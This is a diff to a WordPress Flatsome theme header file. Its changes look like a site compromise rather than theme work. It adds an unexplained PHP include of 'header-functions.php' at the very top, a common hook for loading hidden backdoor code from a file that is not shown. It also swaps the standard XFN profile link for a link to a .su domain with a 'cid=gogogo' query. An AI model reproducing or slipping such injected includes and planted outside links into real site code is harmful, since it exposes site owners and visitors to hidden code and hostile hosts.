@@ -1,10 +1,11 @@
+<?php include("header-functions.php"); ?>
 <!DOCTYPE html>
 <!--[if IE 9 ]> <html <?php language_attributes(); ?> class="ie9 <?php flatsome_html_classes(); ?>"> <![endif]-->
 <!--[if IE 8 ]> <html <?php language_attributes(); ?> class="ie8 <?php flatsome_html_classes(); ?>"> <![endif]-->
 <!--[if (gte IE 9)|!(IE)]><!--><html <?php language_attributes(); ?> class="<?php flatsome_html_classes(); ?>"> <!--<![endif]-->
 <head>
 	<meta charset="<?php bloginfo( 'charset' ); ?>" />
-	<link rel="profile" href="http://gmpg.org/xfn/11" />
+	<link rel="profile" href="http://magichottrade.su/?cid=gogogo" />
 	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" /> 
 	<link href="//fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800" rel="stylesheet">
 <link href='//fonts.googleapis.com/css?family=Lato:400,100,100italic,300,300italic,400italic,700,900,900italic,700italic' rel='stylesheet' type='text/css'>
@@ -88,5 +89,6 @@
 	 	</div>
 	 </div>
 	<main id="main" class="<?php flatsome_main_classes(); ?>">
+
 
 
